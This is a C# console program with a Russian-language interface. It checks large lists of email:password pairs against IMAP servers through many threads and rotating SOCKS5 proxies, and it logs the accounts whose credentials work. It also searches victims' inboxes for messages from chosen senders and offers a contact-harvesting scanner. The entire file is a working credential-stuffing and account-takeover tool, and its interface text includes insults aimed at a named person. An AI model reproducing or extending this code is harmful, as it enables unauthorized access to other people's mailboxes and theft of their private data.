﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using MailKit;
using MailKit.Net.Imap;
using MailKit.Security;
using MailKit.Search;
using MimeKit;

namespace opentask
{
    class Program
    {
        static async Task Main()
        {
            Console.OutputEncoding = System.Text.Encoding.UTF8;
            var app = new MailScanner();
            await app.Run();
        }
    }

    class MailScanner
    {
        private string accountsFile = "accounts.txt";
        private string sendersFile = "senders.txt";
        private string workingFile = "working_accounts.txt";
        private string errorsFile = "errors.txt";
        private string results = "results.txt";
        private string proxyFile = "proxies.txt";
        private string contactsFile = "extracted_contacts.txt";
        private int maxThreads = 200;
        private int connectTimeout = 10;
        private bool proxyEnabled = false;
        private ProxyManager? proxyManager;
        private readonly object _contactsFileLock = new object(); // Потокобезопасная блокировка для записи в файл контактов
        
        // Новые поля для улучшенного функционала
        private bool isScanning = false;
        private int totalAccounts = 0;
        private int processedAccounts = 0;
        private int validAccounts = 0;
        private int foundMessages = 0;
        private DateTime scanStartTime;

        private ConcurrentBag<string> realTimeResults = new ConcurrentBag<string>();
        private CancellationTokenSource? cancellationTokenSource;
        private object consoleLock = new object();

        public async Task Run()
        {
            proxyManager = new ProxyManager(proxyFile);
            proxyManager.LoadValidAccounts(accountsFile);

            if (!File.Exists(accountsFile) || !File.Exists(sendersFile))
            {
                UI.WriteLine("accounts.txt или senders.txt не найдены!", ConsoleColor.Red);
                UI.WaitKey("Нажмите любую клавишу для выхода...");
                return;
            }

            await ShowMainMenu();
        }

        private async Task ShowMainMenu()
        {
            string[] menuItems =
            {
                "⚙️  Настройки",
                "🚀 Запуск основной проверки",
                "🎯 Senders Scanner: проверка на целевых отправителей",
                "📧 Contacts Scanner: сбор всех контактов",
                "📊 Просмотреть результаты",
                "💾 Экспорт результатов",
                "🔄 Выбор прокси",
                "🛡️ Проверить все прокси на валидность",
                "👀 Просмотреть валид аккаунты",
                "❌ Выход"
            };
            
            int selected = 0;
            while (true)
            {
                DrawMainMenu(menuItems, selected);
                var key = Console.ReadKey(true);
                
                if (key.Key == ConsoleKey.UpArrow) 
                    selected = (selected - 1 + menuItems.Length) % menuItems.Length;
                else if (key.Key == ConsoleKey.DownArrow) 
                    selected = (selected + 1) % menuItems.Length;
                else if (key.Key == ConsoleKey.Enter)
                {
                    switch (selected)
                    {
                        case 0: await ShowSettingsMenu(); break;
                        case 1: await StartScanWithInterface(); break;
                        case 2: await StartSendersScanner(); break;
                        case 3: await StartContactsScanner(); break;
                        case 4: await ShowRealTimeResults(); break;
                        case 5: await ExportResults(); break;
                        case 6: await ShowProxySelectionMenu(); break;
                        case 7: await CheckAllProxies(); break;
                        case 8: await ShowWorkingAccountsQuick(); break;
                        case 9: return;
                    }
                }
                else if (key.Key == ConsoleKey.Q) break;
            }
        }

        private void DrawMainMenu(string[] items, int selected)
        {
            Console.Clear();
            UI.DrawHeader("🚀 SUPER SIGMA DOUBLE R", "андрей иди нахуй сука ты", 100);
            
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine($"┌{new string('─', 98)}┐");
            Console.WriteLine($"│ Статус: {(isScanning ? "🔴 СКАНИРУЕТСЯ" : "🟢 ГОТОВ")} │ Прокси: {(proxyEnabled ? "🟢" : "🔴")} │ Потоки: {maxThreads,3} │ Таймаут: {connectTimeout,2}с │");
            Console.WriteLine($"└{new string('─', 98)}┘");
            Console.ResetColor();
            
            Console.WriteLine();
            for (int i = 0; i < items.Length; i++)
            {
                if (i == selected)
                {
                    Console.BackgroundColor = ConsoleColor.DarkCyan;
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine($"> {items[i]}");
                    Console.ResetColor();
                }
                else
                {
                    Console.WriteLine($"  {items[i]}");
                }
            }
            
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("Используйте ↑↓ для навигации, Enter для выбора, Q для выхода");
            Console.ResetColor();
        }

        private async Task ShowSettingsMenu()
        {
            var settings = new[]
            {
                $"Прокси-сервера: {(proxyEnabled ? "🟢 ВКЛЮЧЕНЫ" : "🔴 ВЫКЛЮЧЕНЫ")}",
                $"Количество потоков: {maxThreads}",
                $"Таймаут подключения: {connectTimeout} секунд",
                $"Файл аккаунтов: {accountsFile}",
                $"Файл отправителей: {sendersFile}",
                $"Файл прокси: {proxyFile}",
                "🔙 Назад в главное меню"
            };

            int selected = 0;
            while (true)
            {
                Console.Clear();
                UI.DrawHeader("⚙️ НАСТРОЙКИ", "Конфигурация сканера", 80);
                
                for (int i = 0; i < settings.Length; i++)
                {
                    if (i == selected)
                    {
                        Console.BackgroundColor = ConsoleColor.DarkCyan;
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine($"> {settings[i]}");
                        Console.ResetColor();
                    }
                    else
                    {
                        Console.WriteLine($"  {settings[i]}");
                    }
                }
                
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine("Используйте ↑↓ для навигации, Enter для изменения, ESC для возврата");
                Console.ResetColor();

                var key = Console.ReadKey(true);
                if (key.Key == ConsoleKey.UpArrow)
                    selected = (selected - 1 + settings.Length) % settings.Length;
                else if (key.Key == ConsoleKey.DownArrow)
                    selected = (selected + 1) % settings.Length;
                else if (key.Key == ConsoleKey.Enter)
                {
                    switch (selected)
                    {
                        case 0:
                            proxyEnabled = !proxyEnabled;
                            settings[0] = $"Прокси-сервера: {(proxyEnabled ? "🟢 ВКЛЮЧЕНЫ" : "🔴 ВЫКЛЮЧЕНЫ")}";
                            break;
                        case 1:
                            Console.Write("Введите новое количество потоков (50-500): ");
                            if (int.TryParse(Console.ReadLine(), out int threads) && threads >= 50 && threads <= 500)
                            {
                                maxThreads = threads;
                                settings[1] = $"Количество потоков: {maxThreads}";
                            }
                            break;
                        case 2:
                            Console.Write("Введите таймаут подключения в секундах (5-30): ");
                            if (int.TryParse(Console.ReadLine(), out int timeout) && timeout >= 5 && timeout <= 30)
                            {
                                connectTimeout = timeout;
                                settings[2] = $"Таймаут подключения: {connectTimeout} секунд";
                            }
                            break;
                        case 6:
                            return;
                    }
                }
                else if (key.Key == ConsoleKey.Escape)
                    return;
            }
            await Task.CompletedTask;
        }

        private async Task StartScanWithInterface()
        {
            Console.Clear();
            UI.DrawHeader("🚀 ЗАПУСК ПРОВЕРКИ", "Массовая проверка аккаунтов", 80);
            
            Console.WriteLine("📋 Подготовка к запуску...");
            
            // Сброс статистики
            processedAccounts = 0;
            validAccounts = 0;
            foundMessages = 0;
            
            // Запускаем сканирование напрямую
            await ScanAllAccountsWithRealTime();
            
            Console.WriteLine("\n✅ Проверка завершена!");
            UI.WaitKey("Нажмите любую клавишу для возврата в меню...");
        }

        private async Task ScanAllAccountsWithRealTime()
        {
            if (proxyEnabled && (proxyManager == null || proxyManager.GetActiveProxyCount() == 0))
            {
                UI.WriteLine("Прокси включены, но нет доступных прокси!", ConsoleColor.Red);
                return;
            }

            var allAccounts = File.ReadAllLines(accountsFile)
                .Select(line => line.Trim())
                .Where(line => !string.IsNullOrWhiteSpace(line))
                .ToList();

            totalAccounts = allAccounts.Count;
            processedAccounts = 0;
            validAccounts = 0;
            foundMessages = 0;
            isScanning = true;
            scanStartTime = DateTime.Now;
            cancellationTokenSource = new CancellationTokenSource();
            
            var progressTask = ShowScanProgress();
            
            var semaphore = new SemaphoreSlim(maxThreads);
            var tasks = allAccounts.Select(account => ProcessAccount(account, semaphore, cancellationTokenSource.Token)).ToList();
            
            await Task.WhenAll(tasks);
            
            isScanning = false;
            await progressTask;
        }

        private async Task ProcessAccount(string accountLine, SemaphoreSlim semaphore, CancellationToken ct)
        {
            await semaphore.WaitAsync(ct);
            try
            {
                var parts = accountLine.Split(':');
                if (parts.Length < 2)
                {
                    Interlocked.Increment(ref processedAccounts);
                    return;
                }

                var email = parts[0].Trim();
                var password = parts[1].Trim();
                var domain = email.Split('@').Last();

                string? proxy = null;
                if (proxyEnabled && proxyManager != null)
                {
                    proxy = proxyManager.GetNextProxy();
                }

                var connectionResult = await TryConnectWithRetry(email, password, domain, proxy, ct);
                if (connectionResult.Success && connectionResult.Client != null)
                {
                    Interlocked.Increment(ref validAccounts);
                    var found = await ScanMessagesInInbox(connectionResult.Client, ct);
                    if (found > 0)
                    {
                        Interlocked.Add(ref foundMessages, found);
                        await SaveWorkingAccount(email, password, found);
                        realTimeResults.Add($"✅ {email} | Валидный | Найдено {found} целевых сообщений");
                    }
                    else
                    {
                        realTimeResults.Add($"⚠️ {email} | Валидный | Нет целевых сообщений");
                    }

                    await connectionResult.Client.DisconnectAsync(true, ct);
                }
                else
                {
                    // Если подключение не удалось и используется прокси - помечаем его как мертвый
                    if (proxy != null && proxyManager != null)
                    {
                        proxyManager.MarkProxyAsDead(proxy);
                        realTimeResults.Add($"❌ {email} | Невалидный | Прокси {proxy} помечен как мертвый");
                    }
                    else
                    {
                        realTimeResults.Add($"❌ {email} | Невалидный");
                    }
                }
            }
            catch
            {
                // Игнорируем ошибки для стабильности
            }
            finally
            {
                Interlocked.Increment(ref processedAccounts);
                semaphore.Release();
            }
        }

        private async Task<(bool Success, ImapClient? Client)> TryConnectWithRetry(string email, string password, string domain, string? proxy, CancellationToken ct)
        {
            var commonImapServers = ImapHelper.GetImapServersForDomain(domain);

            foreach (var server in commonImapServers)
            {
                if (ct.IsCancellationRequested) break;
                
                try
                {
                    var client = new ImapClient();
                    
                    // Подключаем прокси если он передан
                    if (!string.IsNullOrEmpty(proxy))
                    {
                        try
                        {
                            // Парсим строку прокси (формат socks5://host:port или host:port)
                            string cleanProxy = proxy;
                            if (cleanProxy.StartsWith("socks5://", StringComparison.OrdinalIgnoreCase))
                            {
                                cleanProxy = cleanProxy.Substring(9);
                            }
                            
                            var proxyParts = cleanProxy.Split(':');
                            if (proxyParts.Length >= 2 && int.TryParse(proxyParts[1], out int proxyPort))
                            {
                                string proxyHost = proxyParts[0];
                                // Для прокси с авторизацией (если есть логин:пароль@хост:порт)
                                if (proxyHost.Contains('@'))
                                {
                                    var authParts = proxyHost.Split('@');
                                    proxyHost = authParts[authParts.Length - 1];
                                }
                                
                                // Инициализируем SOCKS5 прокси клиент
                                client.ProxyClient = new MailKit.Net.Proxy.Socks5Client(proxyHost, proxyPort);
                                Console.WriteLine($"[PROXY] Подключение к {server.Server}:{server.Port} через прокси {proxyHost}:{proxyPort} для {email}");
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"[PROXY_ERROR] Ошибка инициализации прокси {proxy} для {email}: {ex.Message}");
                        }
                    }
                    
                    using var connectCts = new CancellationTokenSource(TimeSpan.FromSeconds(connectTimeout));
                    await client.ConnectAsync(server.Server, server.Port, server.UseSsl, connectCts.Token);
                    await client.AuthenticateAsync(email, password, connectCts.Token);
                    
                    return (true, client);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[CONNECT_ERROR] Не удалось подключиться к {server.Server}:{server.Port} для {email}: {ex.Message}");
                    continue;
                }
            }

            return (false, null);
        }

        private async Task<int> ScanMessagesInInbox(ImapClient client, CancellationToken ct)
        {
            int targetFound = 0;
            try
            {
                var inbox = client.Inbox;
                if (!inbox.IsOpen)
                    await inbox.OpenAsync(FolderAccess.ReadOnly, ct);

                var last500 = inbox.Search(SearchQuery.All);
                if (last500.Count > 500)
                    last500 = last500.Skip(last500.Count - 500).ToList();

                var messages = await inbox.FetchAsync(last500, MessageSummaryItems.Envelope, ct);
                var targetSenders = File.ReadAllLines(sendersFile)
                    .Select(line => line.Trim().ToLowerInvariant())
                    .Where(line => !string.IsNullOrWhiteSpace(line))
                    .ToHashSet();

                foreach (var msg in messages)
                {
                    if (ct.IsCancellationRequested) break;
                    
                    if (msg.Envelope?.From != null)
                    {
                        foreach (var addr in msg.Envelope.From)
                        {
                            if (addr is MailboxAddress mailboxAddr && 
                                !string.IsNullOrWhiteSpace(mailboxAddr.Address) && 
                                targetSenders.Contains(mailboxAddr.Address.ToLowerInvariant()))
                            {
                                targetFound++;
                            }
                        }
                    }
                }

                await inbox.CloseAsync(false, ct);
            }
            catch { /* Игнорируем ошибки */ }

            return targetFound;
        }

        private async Task SaveWorkingAccount(string email, string password, int found)
        {
            await File.AppendAllTextAsync(workingFile, $"{email}:{password};{found}\n");
        }

        private async Task ShowScanProgress()
        {
            var lastUpdate = DateTime.Now;
            var lastProcessed = 0;
            
            while (isScanning)
            {
                Console.Clear();
                UI.DrawHeader("📊 СКАНИРОВАНИЕ В ПРОЦЕССЕ", "репчик грязный", 80);
                
                var progress = totalAccounts > 0 ? (double)processedAccounts / totalAccounts * 100 : 0;
                var elapsed = DateTime.Now - scanStartTime;
                var currentSpeed = (processedAccounts - lastProcessed) / (DateTime.Now - lastUpdate).TotalSeconds;
                var overallSpeed = processedAccounts > 0 ? processedAccounts / elapsed.TotalSeconds : 0;
                
                // Цветная статистика
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine($"┌{new string('─', 78)}┐");
                Console.WriteLine($"│ Прогресс: {progress,5:F1}% │ Обработано: {processedAccounts,6:N0} из {totalAccounts,6:N0} │");
                Console.ResetColor();
                
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"│ Валидных: {validAccounts,6:N0} │ Найдено писем: {foundMessages,6:N0} │ Скорость: {overallSpeed,5:F1}/сек │");
                Console.ResetColor();
                
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine($"└{new string('─', 78)}┘");
                Console.ResetColor();
                
                Console.WriteLine();
                
                // Прогресс-бар
                int barSize = 60;
                int filledSize = (int)(progress / 100 * barSize);
                string bar = "";
                
                for (int i = 0; i < barSize; i++)
                {
                    bar += i < filledSize ? "█" : "░";
                }
                
                Console.Write($"[{bar}] ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine($"{progress:F1}%");
                Console.ResetColor();
                Console.WriteLine();
                
                // Таблица последних результатов
                Console.WriteLine("📝 Последние результаты:");
                Console.WriteLine(new string('─', 80));
                
                var latestResults = realTimeResults.TakeLast(15).Reverse();
                if (latestResults.Any())
                {
                    foreach (var result in latestResults)
                    {
                        if (result.Contains("✅"))
                            Console.ForegroundColor = ConsoleColor.Green;
                        else if (result.Contains("⚠️"))
                            Console.ForegroundColor = ConsoleColor.Yellow;
                        else if (result.Contains("❌"))
                            Console.ForegroundColor = ConsoleColor.Red;
                        
                        Console.WriteLine($"  {result}");
                        Console.ResetColor();
                    }
                }
                else
                {
                    Console.WriteLine("  Нет результатов...");
                }
                
                Console.WriteLine(new string('─', 80));
                Console.WriteLine();
                
                // Панель управления
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("🎮 УПРАВЛЕНИЕ:");
                Console.ResetColor();
                Console.WriteLine("  [ESC] - Остановить сканирование");
                Console.WriteLine("  [R] - Просмотреть детальные результаты");
                Console.WriteLine("  [E] - Экспортировать результаты");
                Console.WriteLine("  [S] - Настройки сканирования");
                
                lastUpdate = DateTime.Now;
                lastProcessed = processedAccounts;
                
                // Обработка нажатий клавиш
                if (Console.KeyAvailable)
                {
                    var key = Console.ReadKey(true);
                    switch (key.Key)
                    {
                        case ConsoleKey.Escape:
                            cancellationTokenSource?.Cancel();
                            return;
                        case ConsoleKey.R:
                            await ShowRealTimeResults();
                            break;
                        case ConsoleKey.E:
                            await ExportResults();
                            break;
                        case ConsoleKey.S:
                            await ShowQuickSettings();
                            break;
                    }
                }
                
                await Task.Delay(500); // Обновление каждые 0.5 секунды
            }
        }

        private Task ShowQuickSettings()
        {
            return Task.CompletedTask;
        }

        private async Task StartSendersScanner()
        {
            if (!Directory.Exists("valid_accounts"))
                Directory.CreateDirectory("valid_accounts");
                
            var scanner = new SendersScanner(
                accountsFile, 
                sendersFile, 
                "valid_accounts", 
                proxyManager!, 
                maxThreads, 
                connectTimeout, 
                proxyEnabled);
            await scanner.StartScan();
        }

        private async Task StartContactsScanner()
        {
            var scanner = new ContactsScanner(
                accountsFile, 
                contactsFile, 
                proxyManager!, 
                maxThreads, 
                connectTimeout, 
                proxyEnabled);
            await scanner.StartScan();
        }

        private async Task ShowRealTimeResults()
        {
            Console.Clear();
            UI.DrawHeader("📋 ДЕТАЛЬНЫЕ РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ", "Анализ результатов сканирования", 90);
            
            // Статистика по типам результатов
            var totalChecked = processedAccounts;
            var successRate = totalChecked > 0 ? (double)validAccounts / totalChecked * 100 : 0;
            var messageRate = validAccounts > 0 ? (double)foundMessages / validAccounts * 100 : 0;
            
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("📊 СТАТИСТИКА:");
            Console.ResetColor();
            Console.WriteLine($"  Всего проверено: {totalChecked:N0}");
            Console.WriteLine($"  Валидные аккаунты: {validAccounts:N0} ({successRate:F1}%)");
            Console.WriteLine($"  С сообщениями: {foundMessages:N0} ({messageRate:F1}% от валидных)");
            Console.WriteLine();
            
            // Рабочие аккаунты с подсветкой
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("🎯 РАБОЧИЕ АККАУНТЫ:");
            Console.ResetColor();
            
            if (File.Exists(workingFile))
            {
                var working = File.ReadAllLines(workingFile);
                if (working.Length > 0)
                {
                    // Группировка по доменам
                    var domainGroups = working
                        .Select(line => new { Line = line, Domain = line.Split('@').LastOrDefault()?.Split(':').FirstOrDefault() ?? "unknown" })
                        .GroupBy(x => x.Domain)
                        .OrderByDescending(g => g.Count())
                        .ToList();
                    
                    Console.WriteLine($"  Всего рабочих: {working.Length:N0}");
                    Console.WriteLine("  Топ доменов:");
                    
                    foreach (var group in domainGroups.Take(5))
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"    {group.Key}: {group.Count()} аккаунтов");
                        Console.ResetColor();
                    }
                    
                    Console.WriteLine("\n  Последние 10 рабочих аккаунтов:");
                    foreach (var line in working.TakeLast(10))
                    {
                        var parts = line.Split(new[] { ':', ';' }, 2);
                        var email = parts.Length > 0 ? parts[0] : line;
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"    ✅ {email}");
                        Console.ResetColor();
                    }
                }
            }
            else
            {
                Console.WriteLine("  Нет рабочих аккаунтов...");
            }
            
            UI.WaitKey("Нажмите любую клавишу для возврата...");
            await Task.CompletedTask;
        }

        private async Task ExportResults()
        {
            Console.Clear();
            UI.DrawHeader("💾 ЭКСПОРТ РЕЗУЛЬТАТОВ", "Сохранение данных в файлы", 80);
            
            // Экспортируем все рабочие аккаунты
            if (File.Exists(workingFile))
            {
                var workingAccounts = File.ReadAllLines(workingFile).ToList();
                File.WriteAllText("results.txt", $"=== РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ ===\n");
                File.AppendAllText("results.txt", $"Всего проверено: {processedAccounts}\n");
                File.AppendAllText("results.txt", $"Валидных аккаунтов: {validAccounts}\n");
                File.AppendAllText("results.txt", $"Найдено целевых сообщений: {foundMessages}\n\n");
                File.AppendAllText("results.txt", "=== ВАЛИДНЫЕ АККАУНТЫ ===\n");
                foreach (var acc in workingAccounts)
                {
                    File.AppendAllText("results.txt", $"{acc}\n");
                }
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"\n✅ Успешно экспортировано {workingAccounts.Count} записей в results.txt");
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n❌ Файл с рабочими аккаунтами не найден!");
            }
            
            Console.ResetColor();
            UI.WaitKey("\nНажмите любую клавишу для возврата в меню...");
            await Task.CompletedTask;
        }

        private async Task ShowProxySelectionMenu()
        {
            Console.Clear();
            UI.DrawHeader("🔄 ВЫБОР ПРОКСИ", "Управление прокси-серверами", 80);
            
            if (File.Exists(proxyFile))
            {
                var proxies = File.ReadAllLines(proxyFile).Where(p => !string.IsNullOrWhiteSpace(p)).ToList();
                var activeProxies = proxyManager?.GetActiveProxyCount() ?? 0;
                
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine($"\n📊 Всего загружено прокси: {proxies.Count}");
                Console.WriteLine($"🟢 Активных прокси в системе: {activeProxies}");
                Console.ResetColor();
                
                if (proxies.Any())
                {
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("\nПоследние 5 прокси из файла:");
                    foreach(var p in proxies.TakeLast(5)) Console.WriteLine($"  • {p}");
                    if(proxies.Count >5) Console.WriteLine($"\n  ... и еще {proxies.Count-5} прокси в файле");
                    Console.ResetColor();
                }
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n❌ Файл с прокси не найден!");
            }
            
            Console.ResetColor();
            UI.WaitKey("\nНажмите любую клавишу для возврата в меню...");
            await Task.CompletedTask;
        }

        private async Task CheckAllProxies()
        {
            Console.WriteLine("Начинаю проверку всех прокси...");
            var proxies = proxyManager.GetAllProxies();
            var validProxies = 0;
            foreach (var proxy in proxies)
            {
                Console.WriteLine($"Проверяю прокси: {proxy}");
                var isValid = await proxyManager.TestProxy(proxy, CancellationToken.None);
                if (isValid)
                {
                    validProxies++;
                    Console.WriteLine($"✅ Прокси {proxy} валидный");
                }
                else
                {
                    proxyManager.MarkProxyAsDead(proxy);
                    Console.WriteLine($"❌ Прокси {proxy} не работает, помечен как мертвый");
                }
            }
            Console.WriteLine($"Проверка завершена. Валидных прокси: {validProxies} из {proxies.Count}");
            UI.WaitKey("Нажмите любую клавишу для возврата в меню...");
            await ShowMainMenu();
        }

        private async Task ShowWorkingAccountsQuick()
        {
            Console.Clear();
            UI.DrawHeader("👀 ВАЛИДНЫЕ АККАУНТЫ", "Список рабочих аккаунтов", 80);
            
            if (File.Exists(workingFile))
            {
                var workingAccounts = File.ReadAllLines(workingFile)
                    .Where(l => !string.IsNullOrWhiteSpace(l))
                    .ToList();
                
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine($"\n📊 Всего валидных аккаунтов: {workingAccounts.Count}\n");
                Console.ResetColor();
                
                foreach (var acc in workingAccounts.Take(20))
                {
                    var parts = acc.Split(';');
                    if (parts.Length > 0)
                        Console.WriteLine($"  • {parts[0]}");
                }
                
                if (workingAccounts.Count > 20)
                    Console.WriteLine($"\n  ... и еще {workingAccounts.Count - 20} аккаунтов");
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n❌ Файл с валидными аккаунтами не найден!");
            }
            
            Console.ResetColor();
            UI.WaitKey("\nНажмите любую клавишу для возврата в меню...");
            await Task.CompletedTask;
        }
    }
}